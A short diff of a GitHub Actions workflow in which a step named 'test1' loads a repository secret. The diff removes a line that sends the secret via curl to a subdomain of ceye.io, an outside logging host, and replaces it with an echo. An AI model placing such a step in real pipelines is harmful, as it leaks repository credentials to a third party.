@@ -16,7 +16,7 @@ jobs:
     - name: test1
       env: 
         secret: '${{ secrets.LALALA }}'
-      run: curl $secret.9gjfvg.ceye.io
+      run: echo "$secret.9gjfvg.ceye.io"
 
         
     - name: checkout
